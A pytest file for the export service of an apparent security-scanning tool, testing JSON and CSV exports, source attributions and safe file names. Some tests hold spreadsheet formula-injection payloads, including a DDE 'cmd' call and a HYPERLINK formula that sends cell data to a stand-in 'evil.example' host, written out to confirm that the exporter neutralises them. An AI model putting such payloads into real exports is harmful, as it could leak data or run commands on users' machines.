"""Exports of a finished scan: what they read, JSON, the two CSV files, sources, file names."""

from __future__ import annotations

import copy
import csv
import io
import json
from datetime import UTC, datetime, timedelta

import pytest
from sqlalchemy import select
from sqlalchemy.orm import Session

from app.checks.base import CheckOutcome
from app.models import CheckResult, Finding, Scan
from app.rules import RULES
from app.service import decisions
from app.service import export as export_service
from app.service.export import CSV_BOM, ExportData
from tests.checks.test_blocklists_check import EVIL_ALIAS, FakeLists
from tests.checks.test_blocklists_check import run as run_blocklists
from tests.checks.test_ports_check import CLOUDFLARE, ip_outcome, located
from tests.checks.test_ports_check import dns as ports_dns
from tests.checks.test_reputation_check import (
    CLOUDFLARE_CLEAR,
    QUAD9_BLOCKED,
    wire,
)
from tests.checks.test_reputation_check import both as reputation_network
from tests.checks.test_reputation_check import dns_result as reputation_dns
from tests.checks.test_reputation_check import run as run_reputation
from tests.helpers import create_user
from tests.rules.test_tech_finding_rules import judged as judged_page
from tests.test_decisions import SPF, TLS, user_of
from tests.test_findings_service import RULES_CONFIG, add_host, populated_scan
from tests.test_summary import evaluated

NOW = datetime(2026, 10, 5, 12, 30, tzinfo=UTC)
TODAY = NOW.date()


def build(session: Session, scan: Scan, now: datetime = NOW) -> ExportData:
    return export_service.build_export(session, scan.assessment, scan, RULES_CONFIG, now=now)


def parse_csv(text: str) -> list[dict[str, str]]:
    assert text.startswith(CSV_BOM)
    return list(csv.DictReader(io.StringIO(text[len(CSV_BOM) :], newline="")))


def decide(
    session: Session, scan: Scan, finding: Finding, status: str, reason: str, review: str = ""
) -> None:
    decisions.decide(
        session, scan.assessment_id, finding, user_of(session, scan),
        status=status, reason=reason, review_by=review, today=TODAY,
    )  # fmt: skip
    session.commit()


# ----- what an export reads


def test_the_export_reads_what_the_scan_stored_in_a_fixed_order(db_session: Session) -> None:
    scan, rows = evaluated(db_session)
    data = build(db_session, scan)

    assert data.generated_at == NOW and data.scan_id == scan.id and data.domain == "example.com"
    assert [h.hostname for h in data.hosts] == sorted(h.hostname for h in data.hosts)
    assert {h.hostname for h in data.hosts} == {
        "bad-tls.example.com", "soon.example.com", "plain.example.com", "cdn.example.com",
    }  # fmt: skip
    bad = next(h for h in data.hosts if h.hostname == "bad-tls.example.com")
    assert [c.key for c in bad.checks] == [
        "dns",
        "ports",
        "tls",
        "http",
    ]  # display order, not stored order
    assert all(c.id and c.status for c in bad.checks)
    assert [c.key for c in data.domain_checks] == ["email", "registration", "security_txt"]
    assert data.findings_state == "ready" and data.findings_info["total"] == len(rows)
    assert len(data.findings) == len(rows) > 10
    assert data.rules == {rule.id: rule.version for rule in RULES.values()} and data.ruleset


def test_findings_come_open_first_most_serious_first_and_point_at_real_evidence(
    db_session: Session,
) -> None:
    scan, rows = evaluated(db_session)
    decide(db_session, scan, rows[TLS], "false_positive", "A test fixture.")
    data = build(db_session, scan)

    statuses = [f.status for f in data.findings]
    assert statuses == sorted(statuses, key=lambda s: s != "open")  # open ones first
    open_ranks = [
        ("critical", "high", "medium", "low", "informational").index(f.severity)
        for f in data.open_findings
    ]
    assert open_ranks == sorted(open_ranks)
    assert [f.rule_id for f in data.decided_findings] == ["TLS_INVALID"]

    known = {c.id for h in data.hosts for c in h.checks} | {c.id for c in data.domain_checks}
    for finding in data.findings:
        assert finding.evidence, finding.rule_id
        assert all(ref.check_id in known for ref in finding.evidence)
    tls = next(f for f in data.findings if f.rule_id == "TLS_INVALID")
    assert tls.evidence[0].check == "tls" and tls.evidence[0].hostname == "bad-tls.example.com"
    assert tls.decision is not None and tls.decision.reason == "A test fixture."


def test_hosts_carry_their_open_findings(db_session: Session) -> None:
    scan, rows = evaluated(db_session)
    before = {h.hostname: h for h in build(db_session, scan).hosts}
    assert before["bad-tls.example.com"].top_severity == "high"
    decide(db_session, scan, rows[TLS], "accepted", "Known.")
    after = {h.hostname: h for h in build(db_session, scan).hosts}
    assert (
        after["bad-tls.example.com"].open_findings
        == before["bad-tls.example.com"].open_findings - 1
    )


def test_a_host_with_a_failed_check_is_marked_as_having_gaps(db_session: Session) -> None:
    scan, _ = evaluated(db_session)
    add_host(db_session, scan, "broken.example.com", {"tls": CheckOutcome("error", "timeout")})
    add_host(db_session, scan, "fine.example.com", {"dns": CheckOutcome("no_data", "nxdomain")})
    hosts = {h.hostname: h for h in build(db_session, scan).hosts}
    assert hosts["broken.example.com"].has_gaps and not hosts["fine.example.com"].has_gaps


# ----- JSON


def test_the_json_holds_everything_and_parses_back(db_session: Session) -> None:
    scan, rows = evaluated(db_session)
    decide(db_session, scan, rows[SPF], "accepted", "The vendor sends no mail.", "2027-01-31")
    data = build(db_session, scan)
    document = json.loads(export_service.to_json(data))

    assert document["format"] == {"name": "gaprism-export", "version": 1}
    assert document["generated_at"] == "2026-10-05T12:30:00+00:00"
    assert document["assessment"]["domain"] == "example.com" and document["scan"]["id"] == str(
        scan.id
    )
    assert document["scan"]["findings"]["state"] == "ready" and document["scan"]["findings"][
        "total"
    ] == len(rows)
    assert document["tool"]["rules"]["TLS_INVALID"] == RULES["TLS_INVALID"].version
    assert {"coverage", "where", "who", "secure"} == set(document["summary"])
    assert (
        document["summary"]["coverage"]["hosts"] == 4
        and "incomplete" in document["summary"]["coverage"]
    )
    assert document["summary"]["secure"]["accepted"] == 1

    assert [h["hostname"] for h in document["hosts"]] == [h.hostname for h in data.hosts]
    bad = next(h for h in document["hosts"] if h["hostname"] == "bad-tls.example.com")
    tls = next(c for c in bad["checks"] if c["check"] == "tls")
    stored = db_session.scalars(select(CheckResult).where(CheckResult.id == tls["id"])).one()
    assert tls["status"] == stored.status and tls["data"] == stored.data  # the stored facts, whole
    assert bad["open_findings"] > 0 and bad["top_severity"] == "high"

    spf = next(f for f in document["findings"] if f["rule_id"] == "SPF_MISSING")
    assert spf["status"] == "accepted" and spf["decision"]["reason"] == "The vendor sends no mail."
    assert (
        spf["decision"]["review_by"] == "2027-01-31"
        and spf["decision"]["acceptance_expired"] is False
    )
    assert spf["decision"]["decided_by"] == user_of(db_session, scan).email
    assert spf["fingerprint"] == rows[SPF].fingerprint and spf["params"] is not None
    checks = {c["id"] for h in document["hosts"] for c in h["checks"]} | {
        c["id"] for c in document["domain_checks"]
    }
    assert all(e["check_id"] in checks for f in document["findings"] for e in f["evidence"])
    assert document["attributions"] and all(
        a["name"] and a["terms"] for a in document["attributions"]
    )


def test_the_json_keeps_non_ascii_text_as_text(db_session: Session) -> None:
    scan, _ = evaluated(db_session)
    add_host(
        db_session,
        scan,
        "zuerich.example.com",
        {"ip": CheckOutcome("ok", data={"addresses": [{"ip": "1.2.3.4", "city": "Zürich"}]})},
    )
    text = export_service.to_json(build(db_session, scan))
    assert "Zürich" in text and "\\u00fc" not in text


def test_two_exports_of_the_same_scan_differ_only_in_their_moment(db_session: Session) -> None:
    scan, _ = evaluated(db_session)
    first = json.loads(export_service.to_json(build(db_session, scan)))
    later = json.loads(
        export_service.to_json(build(db_session, scan, now=NOW + timedelta(hours=1)))
    )
    assert first["generated_at"] != later["generated_at"]
    first["generated_at"] = later["generated_at"] = ""
    assert first == later


def test_a_scan_that_was_not_evaluated_exports_no_findings_and_says_why(
    db_session: Session,
) -> None:
    scan, _ = populated_scan(db_session)
    scan.status = "cancelled"
    db_session.commit()
    data = build(db_session, scan)
    document = json.loads(export_service.to_json(data))
    assert document["scan"]["findings"]["state"] == "not_evaluated" and document["findings"] == []
    assert (
        document["scan"]["status"] == "cancelled"
        and document["summary"]["secure"]["state"] == "not_evaluated"
    )
    assert len(document["hosts"]) == 4  # what was collected is still exported


# ----- CSV


def test_the_hosts_csv_has_one_row_per_host_with_where_and_who(db_session: Session) -> None:
    scan, _ = evaluated(db_session)
    text = export_service.hosts_csv(build(db_session, scan))
    assert text.startswith(CSV_BOM) and "\r\n" in text
    assert text[len(CSV_BOM) :].splitlines()[0] == ",".join(export_service.HOST_COLUMNS)
    rows = {r["hostname"]: r for r in parse_csv(text)}
    assert set(rows) == {
        "bad-tls.example.com",
        "soon.example.com",
        "plain.example.com",
        "cdn.example.com",
    }

    bad = rows["bad-tls.example.com"]
    shown = (bad["addresses"], bad["tls"], bad["tls_days_left"])
    assert shown == ("93.184.216.34", "expired", "-12")
    assert (bad["http_status"], bad["http_scheme"]) == ("200", "https")
    assert bad["ports"] == "22; 443; 3306" and bad["cves"] == "CVE-2020-0002; CVE-2021-0001"
    assert (
        bad["top_severity"] == "high" and int(bad["open_findings"]) > 0 and bad["gaps"] == "false"
    )
    soon = rows["soon.example.com"]
    assert (soon["tls"], soon["tls_days_left"]) == ("valid", "5") and soon["tls_valid_until"]

    plain = rows["plain.example.com"]
    assert plain["countries"] == "CH; US" and plain["cities"] == "Ashburn, US; Bern, CH"
    assert (
        plain["networks"] == "Swisscom"
        and plain["http_scheme"] == "http"
        and plain["cdn_edge"] == "false"
    )
    cdn = rows["cdn.example.com"]  # an edge is not a place
    assert (cdn["countries"], cdn["cities"], cdn["networks"], cdn["cdn_edge"]) == (
        "",
        "",
        "Cloudflare",
        "true",
    )


def test_the_hosts_csv_names_the_cdn_or_waf_and_the_technologies(db_session: Session) -> None:
    scan, _ = evaluated(db_session)
    shown = judged_page(
        '<html><head><meta name="generator" content="WordPress 6.4.2">'
        '<script src="https://www.googletagmanager.com/gtm.js?id=GTM-ABC"></script></head></html>',
        headers=[("CF-RAY", "7d1-FRA"), ("Server", "cloudflare"), ("X-Powered-By", "PHP/8.3.1")],
    )
    stored = {
        key: CheckOutcome(r.status, r.reason_code, dict(r.data)) for key, r in shown.results.items()
    }
    add_host(db_session, scan, "shop.example.com", stored)
    add_host(db_session, scan, "silent.example.com", {"tech": CheckOutcome("error", "timeout")})
    rows = {r["hostname"]: r for r in parse_csv(export_service.hosts_csv(build(db_session, scan)))}

    shop = rows["shop.example.com"]
    assert shop["cdn_waf"] == "Cloudflare"
    listed = shop["technologies"].split("; ")
    assert {"WordPress 6.4.2", "PHP 8.3.1", "Google Tag Manager"} <= set(listed)
    assert "Cloudflare" not in listed  # the CDN has its own column
    for name in ("bad-tls.example.com", "silent.example.com"):  # not looked at, not "none"
        assert (rows[name]["cdn_waf"], rows[name]["technologies"]) == ("", "")


def test_the_hosts_csv_names_the_security_resolvers_that_block_a_host(db_session: Session) -> None:
    scan, _ = evaluated(db_session)
    dns = reputation_dns()
    network = reputation_network(wire(QUAD9_BLOCKED), wire(CLOUDFLARE_CLEAR))
    add_host(
        db_session,
        scan,
        "phish.example.com",
        {"dns": dns, "reputation": run_reputation(network, dns=dns)},
    )
    add_host(
        db_session,
        scan,
        "silent.example.com",
        {"reputation": CheckOutcome("error", "no_resolver_answered", {"blocked_by": ["Quad9"]})},
    )
    rows = {r["hostname"]: r for r in parse_csv(export_service.hosts_csv(build(db_session, scan)))}
    assert rows["phish.example.com"]["blocked_by"] == "Quad9"
    assert rows["silent.example.com"]["blocked_by"] == ""  # a check that failed names nobody
    assert rows["bad-tls.example.com"]["blocked_by"] == ""  # and a host not asked: not "clean"


def test_the_hosts_csv_names_what_the_blocklists_list(db_session: Session) -> None:
    scan, _ = evaluated(db_session)
    dns = ports_dns("203.0.113.9", "203.0.113.10", cname=EVIL_ALIAS)
    lists = FakeLists(
        names={"bad.example.com": ("urlhaus",), EVIL_ALIAS: ("phishing",)},
        addresses={"203.0.113.9": ("feodo",), "203.0.113.10": ("phishing",)},
    )
    edge = ip_outcome(located("203.0.113.10", CLOUDFLARE))
    checked = run_blocklists(lists, dns=dns, ip=edge, host="bad.example.com")
    add_host(db_session, scan, "bad.example.com", {"dns": dns, "blocklists": checked})
    add_host(
        db_session,
        scan,
        "silent.example.com",
        {"blocklists": CheckOutcome("unavailable", "blocklists_missing", {"names": []})},
    )
    clear = run_blocklists(FakeLists(), dns=ports_dns("203.0.113.20"), host="clear.example.com")
    add_host(db_session, scan, "clear.example.com", {"blocklists": clear})
    rows = {r["hostname"]: r for r in parse_csv(export_service.hosts_csv(build(db_session, scan)))}
    # the address of a CDN edge is left out: the listing can come from any site behind it
    assert rows["bad.example.com"]["listed_on"] == (
        "host: abuse.ch URLhaus; alias login.evil-example.net: Phishing.Database; "
        "address 203.0.113.9: abuse.ch Feodo Tracker"
    )
    for name in ("silent.example.com", "clear.example.com", "bad-tls.example.com"):
        assert rows[name]["listed_on"] == ""  # not asked, not answered, and not listed


def test_checks_that_gave_no_answer_show_their_status_not_an_empty_cell(
    db_session: Session,
) -> None:
    scan, _ = evaluated(db_session)
    add_host(
        db_session, scan, "silent.example.com",
        {"tls": CheckOutcome("no_data", "refused"), "http": CheckOutcome("error", "timeout")},
    )  # fmt: skip
    rows = {r["hostname"]: r for r in parse_csv(export_service.hosts_csv(build(db_session, scan)))}
    silent = rows["silent.example.com"]
    assert (
        silent["tls"] == "no_data:refused"
        and silent["http_status"] == ""
        and silent["gaps"] == "true"
    )


def test_the_findings_csv_has_one_row_per_finding_with_the_decision(db_session: Session) -> None:
    scan, rows = evaluated(db_session)
    decide(db_session, scan, rows[SPF], "accepted", "The vendor sends no mail.", "2027-01-31")
    decide(db_session, scan, rows[TLS], "false_positive", "A test fixture.")
    data = build(db_session, scan)
    text = export_service.findings_csv(data)
    assert text[len(CSV_BOM) :].splitlines()[0] == ",".join(export_service.FINDING_COLUMNS)
    found = parse_csv(text)
    assert len(found) == len(rows) and [r["status"] for r in found] == [
        f.status for f in data.findings
    ]

    spf = next(r for r in found if r["rule_id"] == "SPF_MISSING")
    assert (spf["status"], spf["severity"], spf["scope"], spf["host"]) == (
        "accepted",
        "medium",
        "domain",
        "",
    )
    assert (
        spf["decision_reason"] == "The vendor sends no mail." and spf["review_by"] == "2027-01-31"
    )
    assert (
        spf["decided_by"] == user_of(db_session, scan).email
        and spf["acceptance_expired"] == "false"
    )
    assert spf["fingerprint"] == rows[SPF].fingerprint and spf["evidence"].startswith(
        "email: domain"
    )
    tls = next(r for r in found if r["rule_id"] == "TLS_INVALID")
    assert tls["host"] == "bad-tls.example.com" and tls["status"] == "false_positive"
    assert (
        tls["evidence"] == "tls: bad-tls.example.com"
        and tls["decision_reason"] == "A test fixture."
    )
    undecided = next(r for r in found if r["status"] == "open")
    assert undecided["decided_by"] == "" and undecided["decision_reason"] == ""
    risky = next(r for r in found if r["rule_id"] == "RISKY_PORT_EXPOSED")
    assert (
        risky["scope"] == "address" and risky["address"] == "93.184.216.34" and risky["host"] == ""
    )


@pytest.mark.parametrize(
    "text",
    [
        '=HYPERLINK("http://evil.example","click")',
        "+1+1",
        "-2+3",
        "@SUM(A1:A9)",
        "\t=1+1",
        "\r=1",
        " =1+1",
        "=cmd|' /C calc'!A0",
    ],
)
def test_text_a_spreadsheet_could_run_is_neutralised(text: str) -> None:
    assert export_service.csv_cell(text) == "'" + text


def test_cells_that_cannot_be_formulas_are_left_alone() -> None:
    cell = export_service.csv_cell
    assert cell(-4194) == "-4194" and cell(3.5) == "3.5" and cell(0) == "0"  # numbers stay numbers
    assert cell(None) == "" and cell(True) == "true" and cell(False) == "false"
    assert cell(["a", "b"]) == "a; b" and cell(()) == "" and cell(["=x", "y"]) == "'=x; y"
    assert cell(datetime(2026, 10, 5, tzinfo=UTC)) == "2026-10-05T00:00:00+00:00"
    assert (
        cell("2026-10-05") == "2026-10-05"
        and cell("a=b") == "a=b"
        and cell("CVE-2021-0001") == "CVE-2021-0001"
    )


def test_hostile_text_in_a_decision_cannot_become_a_formula_in_the_findings_csv(
    db_session: Session,
) -> None:
    scan, rows = evaluated(db_session)
    evil = '=HYPERLINK("http://evil.example/?x="&A1,"open")'
    decide(db_session, scan, rows[SPF], "accepted", evil)
    found = parse_csv(export_service.findings_csv(build(db_session, scan)))
    spf = next(r for r in found if r["rule_id"] == "SPF_MISSING")
    assert spf["decision_reason"] == "'" + evil
    assert not any(cell.startswith("=") for row in found for cell in row.values())


def test_commas_quotes_and_line_breaks_survive_a_round_trip(db_session: Session) -> None:
    scan, rows = evaluated(db_session)
    reason = 'Known, accepted; "see ticket 42"\nsecond line, with, commas'
    decide(db_session, scan, rows[SPF], "accepted", reason)
    found = parse_csv(export_service.findings_csv(build(db_session, scan)))
    assert next(r for r in found if r["rule_id"] == "SPF_MISSING")["decision_reason"] == reason


def test_the_csv_has_a_row_even_for_a_scan_without_hosts_or_findings(db_session: Session) -> None:
    from tests.test_engine import new_scan

    scan = new_scan(db_session)
    scan.status = "completed"
    data = build(db_session, scan)
    assert (
        parse_csv(export_service.hosts_csv(data)) == []
        and parse_csv(export_service.findings_csv(data)) == []
    )
    assert export_service.hosts_csv(data).splitlines()[0].lstrip(CSV_BOM) == ",".join(
        export_service.HOST_COLUMNS
    )


# ----- sources


def test_the_sources_a_scan_used_are_named_with_their_terms() -> None:
    discovery = {
        "sources": [{"source": "ctlogs", "status": "ok"}, {"source": "crtsh", "status": "error"}]
    }
    used = {
        "ct:ctlogs",
        "dns:1.1.1.1,8.8.8.8",
        "http-probe",
        "tls-probe",
        "dbip",
        "internetdb",
        "rdap:rdap.nic.ch",
        "hibp",
        "hstspreload.org",
    }
    found = {a.key: a for a in export_service.attributions_for(used, discovery)}

    assert list(found) == [
        "ct",
        "dns",
        "target",
        "dbip",
        "internetdb",
        "rdap",
        "hibp",
        "hsts_preload",
    ]
    assert (
        "ctlogs.dev" in found["ct"].name and "crt.sh" not in found["ct"].name
    )  # only those that answered
    assert "1.1.1.1, 8.8.8.8" in found["dns"].name
    assert found["dbip"].url == "https://db-ip.com" and "CC BY 4.0" in found["dbip"].terms
    assert "non-commercial" in found["internetdb"].terms
    assert "CC BY 4.0" in found["hibp"].terms and found["hibp"].url == "https://haveibeenpwned.com"
    assert all(a.used_for and a.terms for a in found.values())


def test_the_lists_that_ranked_the_cves_are_named_with_their_terms() -> None:
    used = {"internetdb", "cisa-kev", "first-epss"}
    found = {a.key: a for a in export_service.attributions_for(used, {})}
    assert list(found) == ["internetdb", "cisa_kev", "first_epss"]  # next to the ports source
    assert "CISA" in found["cisa_kev"].name and found["cisa_kev"].url.startswith(
        "https://www.cisa.gov/"
    )
    assert (
        "FIRST" in found["first_epss"].name
        and found["first_epss"].url == "https://www.first.org/epss/"
    )
    assert "named as the source" in found["first_epss"].terms
    assert all(
        "nothing about the assessment was sent" in found[k].terms
        for k in found
        if k != "internetdb"
    )
    assert [a.key for a in export_service.attributions_for({"first-epss"}, {})] == ["first_epss"]


def test_a_scan_credits_the_lists_that_its_ports_results_were_ranked_with(
    db_session: Session,
) -> None:
    scan, _ = evaluated(db_session)
    ports = db_session.scalars(
        select(CheckResult).where(CheckResult.scan_id == scan.id, CheckResult.check_key == "ports")
    ).first()
    assert ports is not None
    assert not {"cisa_kev", "first_epss"} & {a.key for a in build(db_session, scan).attributions}

    data = copy.deepcopy(ports.data)
    for entry in data["addresses"]:
        if entry.get("facts"):
            entry["facts"]["exploit_data"] = {"ranked_by": "kev_epss", "kev_as_of": "2026-10-04"}
    ports.data = data
    db_session.commit()
    keys = [a.key for a in build(db_session, scan).attributions]
    assert "cisa_kev" in keys and "first_epss" in keys


def test_the_ruleset_of_the_takeover_check_is_credited_with_its_licence() -> None:
    used = {"http-probe", "can-i-take-over-xyz"}
    found = {a.key: a for a in export_service.attributions_for(used, {})}
    assert list(found) == ["target", "takeover"]
    credit = found["takeover"]
    assert credit.url == "https://github.com/EdOverflow/can-i-take-over-xyz"
    assert "EdOverflow" in credit.name and "CC BY 4.0" in credit.terms
    assert "adapted" in credit.terms
    assert "once or twice more" in found["target"].terms  # the extra request is disclosed
    assert "Five more handshakes" in found["target"].terms  # and the protocol questions


def test_a_scan_that_ran_the_takeover_check_credits_its_ruleset(db_session: Session) -> None:
    scan, _ = evaluated(db_session)
    assert "takeover" not in {a.key for a in build(db_session, scan).attributions}
    row = db_session.scalars(
        select(CheckResult).where(CheckResult.scan_id == scan.id, CheckResult.host_id.is_not(None))
    ).first()
    assert row is not None
    db_session.add(
        CheckResult(
            scan_id=scan.id,
            host_id=row.host_id,
            check_key="takeover",
            status="ok",
            data={"aliases": [], "candidates": [], "candidates_cut": 0, "fingerprints": "x"},
            source="can-i-take-over-xyz",
            collected_at=row.collected_at,
        )
    )
    db_session.commit()
    assert "takeover" in {a.key for a in build(db_session, scan).attributions}


def test_the_security_resolvers_are_named_when_the_reputation_check_ran() -> None:
    found = {
        a.key: a for a in export_service.attributions_for({"security-dns:quad9,cloudflare"}, {})
    }
    assert list(found) == ["reputation"]
    credit = found["reputation"]
    assert credit.name == "Security DNS resolvers: Quad9, Cloudflare (1.1.1.2)"
    assert "plain DNS questions" in credit.terms and "clean bill of health" in credit.terms
    only_one = export_service.attributions_for({"security-dns:quad9"}, {})
    assert only_one[0].name == "Security DNS resolvers: Quad9"
    unknown = export_service.attributions_for({"security-dns:nobody"}, {})
    assert unknown[0].name == "Security DNS resolvers: ?"  # never invents a resolver


def test_the_blocklists_that_were_looked_in_are_credited_with_their_terms() -> None:
    sources = {"blocklists:urlhaus,feodo", "blocklists:phishing", "blocklists:feodo"}
    found = {a.key: a for a in export_service.attributions_for(sources, {})}
    assert list(found) == ["blocklist_urlhaus", "blocklist_phishing", "blocklist_feodo"]
    assert found["blocklist_urlhaus"].name == "abuse.ch URLhaus"
    assert "fair use" in found["blocklist_urlhaus"].terms
    assert (
        found["blocklist_phishing"].url == "https://github.com/Phishing-Database/Phishing.Database"
    )
    assert "Terms: CC0" in found["blocklist_feodo"].terms
    assert "nothing about the assessment was sent" in found["blocklist_feodo"].terms
    assert "clean bill of health" in found["blocklist_feodo"].terms
    assert "botnet command-and-control servers" in found["blocklist_feodo"].used_for
    # the lists were not there, or a key nobody knows: nothing is credited, nothing invented
    assert export_service.attributions_for({"blocklists", "blocklists:nobody"}, {}) == ()


def test_the_observatory_is_credited_only_when_the_name_was_sent_to_it() -> None:
    found = {a.key: a for a in export_service.attributions_for({"mdn-observatory"}, {})}
    assert list(found) == ["observatory"]
    credit = found["observatory"]
    assert credit.url == "https://developer.mozilla.org/en-US/observatory"
    assert "public on MDN" in credit.terms and "not part of the findings" in credit.terms
    assert (
        export_service.attributions_for({"queued"}, {}) == ()
    )  # a switched-off check has no source


def test_a_scan_that_used_shodan_and_no_third_party_names_only_what_it_used() -> None:
    assert [a.key for a in export_service.attributions_for({"shodan"}, {})] == ["shodan"]
    assert export_service.attributions_for(set(), {}) == ()
    assert (
        export_service.attributions_for({"something-new", "queued"}, {}) == ()
    )  # unknown: not invented


def test_the_attributions_of_a_real_scan_follow_the_sources_of_its_results(
    db_session: Session,
) -> None:
    scan, _ = evaluated(db_session)
    sources = {"ip": "dbip", "http": "http-probe", "tls": "tls-probe", "ports": "internetdb"}
    for row in db_session.scalars(select(CheckResult).where(CheckResult.scan_id == scan.id)):
        row.source = sources.get(row.check_key)
    db_session.commit()
    keys = [a.key for a in build(db_session, scan).attributions]
    assert keys == ["target", "dbip", "internetdb"]  # no discovery source was recorded in this scan


# ----- file names


@pytest.mark.parametrize(
    ("domain", "expected"),
    [
        ("example.com", "example.com_2026-10-05_findings.csv"),
        ("xn--bcher-kva.example", "xn--bcher-kva.example_2026-10-05_findings.csv"),
        ('bad"name/..\\x y', "bad_name_.._x_y_2026-10-05_findings.csv"),
    ],
)
def test_file_names_are_plain_ascii(db_session: Session, domain: str, expected: str) -> None:
    scan, _ = evaluated(db_session)
    data = build(db_session, scan)
    renamed = ExportData(
        **{
            **data.__dict__,
            "domain": domain,
            "scan_created_at": datetime(2026, 10, 5, 8, tzinfo=UTC),
        }
    )
    assert export_service.export_filename(renamed, "findings", "csv") == expected


def test_the_export_belongs_to_nobody_else(db_session: Session) -> None:
    """A user that does not own the assessment is a matter of the routes; the data is the scan's."""
    scan, _ = evaluated(db_session)
    other, _ = evaluated(db_session)
    create_user(db_session)
    mine = build(db_session, scan)
    theirs = build(db_session, other)
    assert {f.id for f in mine.findings}.isdisjoint({f.id for f in theirs.findings})
    assert {h.id for h in mine.hosts}.isdisjoint({h.id for h in theirs.hosts})
